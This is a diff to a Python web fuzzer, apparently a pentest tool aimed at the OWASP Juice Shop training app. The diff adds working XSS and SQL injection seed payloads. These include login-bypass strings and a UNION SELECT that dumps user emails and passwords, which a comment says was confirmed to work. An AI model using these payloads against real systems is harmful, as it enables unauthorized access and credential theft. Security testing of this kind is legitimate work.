@@ -5,7 +5,7 @@ import json, uuid, random, string
 from pathlib import Path
 from typing import Dict, Any, List, Optional, Tuple
 from urllib.parse import (
-    urlparse, urlencode, urlunparse, parse_qs, parse_qsl, quote_plus
+    urlparse, urlencode, urlunparse, parse_qs, quote_plus
 )
 
 DEFAULT_TIMEOUT_S = 12.0
@@ -38,7 +38,7 @@ TOKEN_KEYS = {
     "csrf", "_csrf", "xsrf", "_xsrf",
     "authenticity_token",
     "__requestverificationtoken", "requestverificationtoken", "_requestverificationtoken",
-    "token"
+    "token", "id_token", "access_token"
 }
 def _is_token_param(name: Optional[str]) -> bool:
     if not name: return True
@@ -58,7 +58,7 @@ except Exception:
     _PP = None
 # ---------------------------------------------------------------------------
 
-# Payload families
+# Payload families (seed lists; fuzzer will extend context-aware)
 PAYLOADS = {
     "xss": [
         '"><svg/onload=alert(1)>',
@@ -67,7 +67,9 @@ PAYLOADS = {
     ],
     "sqli": [
         "' OR '1'='1",
+        "' OR '1'='2",
         "\" OR \"1\"=\"1",
+        "\" OR \"1\"=\"2",
         "';WAITFOR DELAY '0:0:3'--",
         "' UNION SELECT NULL--",
     ],
@@ -126,7 +128,7 @@ def _find_storage_state(job_dir: Path) -> Optional[Path]:
     """
     try:
         blob = json.loads((job_dir / "crawl_result.json").read_text("utf-8"))
-        p = blob.get("session_state_path")
+        p = blob.get("session_state_path") or blob.get("storage_state_path")
         if p:
             pth = Path(p)
             if pth.exists():
@@ -156,18 +158,37 @@ def _baseline_value(name: str) -> str:
     return "test"
 
 def _payload_plan(param_name: str, method: str, content_type: Optional[str], path: str) -> List[str]:
-    n = param_name.lower()
+    """
+    Provide a smart seed list per-parameter. The fuzzer will still add its own
+    context-aware probes. This ensures we hit your 'proven' cases quickly.
+    """
+    n = (param_name or "").lower()
+    pth = (path or "").lower()
     plan: List[str] = []
-    # param hints
+
+    # --- XSS probes for user-visible/reflected fields
     if any(k in n for k in ["q", "query", "search", "name", "title", "comment", "message", "content", "text"]):
         plan += PAYLOADS["xss"] + PAYLOADS["base"]
-    if any(k in n for k in ["id", "uid", "user", "product", "item", "order", "sort", "orderby"]):
+
+    # --- SQLi probes for identifiers/search
+    if any(k in n for k in ["id", "uid", "user", "product", "item", "order", "sort", "orderby", "q", "query", "search", "s"]):
         plan += PAYLOADS["sqli"] + PAYLOADS["base"]
+        # Juice Shop UNION that you confirmed works (fast path)
+        if "/rest/products/search" in pth or n in ("q","query","search","s"):
+            plan += ["qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"]
+
+    # --- Login-ish fields (JSON or form)
+    looks_like_login = ("login" in pth) or (n in {"email","username","user","login"})
+    if looks_like_login and (method.upper() in {"POST","PUT","PATCH"}):
+        # Ensure boolean-based SQLi is tried first
+        plan = ["' OR '1'='1' -- ", "' OR '1'='2' -- "] + plan
+
+    # --- Open-redirect probes
     if any(k in n for k in ["url", "next", "to", "dest", "redirect", "return", "return_to", "redirect_uri", "callback", "continue"]):
         plan += PAYLOADS["redir"] + PAYLOADS["base"]
 
-    # weak context fallback
-    if not plan and method == "POST" and (content_type or "").startswith("application/json"):
+    # Weak context fallback
+    if not plan and method.upper() == "POST" and (content_type or "").startswith("application/json"):
         plan += PAYLOADS["sqli"][:2] + PAYLOADS["base"]
     if not plan:
         plan = PAYLOADS["base"]
@@ -187,16 +208,19 @@ def _priority_score(method: str, url: str, param: str) -> float:
             pass
     # fallback heuristics
     s = 0.0
-    lp, lu = param.lower(), url.lower()
-    if lp in {"id","uid","pid","productid","user","q","search","query","to","return_to","redirect","url","redirect_uri"}:
+    lp, lu = (param or "").lower(), (url or "").lower()
+    if lp in {"id","uid","pid","productid","user","q","search","query","s","to","return_to","redirect","url","redirect_uri"}:
         s += 0.6
-    if any(x in lu for x in ("/login", "/auth", "/admin", "/search", "/redirect", "/report", "/download", "/oauth")):
-        s += 0.2
-    if method in {"GET", "DELETE"}:
+    if any(x in lu for x in ("/login", "/auth", "/admin", "/search", "/redirect", "/report", "/download", "/rest/products/search", "/rest/user/login")):
+        s += 0.25
+    if method.upper() in {"GET", "DELETE"}:
         s += 0.1
     return min(1.0, s)
 
 def _merge_headers(h1: Optional[Dict[str, str]], h2: Optional[Dict[str, str]]) -> Dict[str, str]:
+    """
+    Merge headers left-to-right; later dict wins.
+    """
     out: Dict[str, str] = {}
     for src in (h1 or {}), (h2 or {}):
         for k, v in src.items():
@@ -218,7 +242,7 @@ def _dedupe_key(method: str, url: str, where: str, param: str, ctype: Optional[s
     return (method.upper(), url, where, param, (ctype or "").lower())
 
 # =============================================================================
-# NEW: builder for the core engine
+# Core builder for fuzzer_core.run_fuzz
 # =============================================================================
 def build_targets(
     merged_endpoints: List[Dict[str, Any]],
@@ -282,8 +306,8 @@ def build_targets(
         }
 
         # Filter params (drop tokens/empty)
-        q_params: List[str] = [p for p in (param_locs.get("query") or []) if not _is_token_param(p)]
-        b_params: List[str] = [p for p in (param_locs.get("body") or []) if not _is_token_param(p)]
+        q_params: List[str] = [p for p in (param_locs.get("query") or []) if p and not _is_token_param(p)]
+        b_params: List[str] = [p for p in (param_locs.get("body") or []) if p and not _is_token_param(p)]
 
         if not q_params and not b_params:
             continue  # nothing actionable
@@ -296,7 +320,7 @@ def build_targets(
             headers["Authorization"] = bt if bt.lower().startswith("bearer ") else f"Bearer {bt}"
         if cookie_header:
             headers["Cookie"] = cookie_header
-        # ensure captured headers don't overwrite our Authorization/Cookie
+        # ensure our Authorization/Cookie override captured
         headers = _merge_headers(cap_headers, headers)
 
         # Build baseline templates (prefer crawler-provided)
@@ -536,8 +560,8 @@ def _add_priority_scores(targets: List[Dict[str, Any]]) -> None:
             lu = u.lower()
             if lp in {"id","uid","pid","productid","user","q","search","query","to","return_to","redirect","url"}:
                 score += 0.6
-            if any(x in lu for x in ("/login", "/auth", "/admin", "/search", "/redirect", "/report", "/download")):
-                score += 0.2
+            if any(x in lu for x in ("/login", "/auth", "/admin", "/search", "/redirect", "/report", "/download", "/rest/products/search", "/rest/user/login")):
+                score += 0.25
             if (t.get("method") or "").upper() in {"GET", "DELETE"}:
                 score += 0.1
         score += min(0.3, 0.03 * max(0, freq))
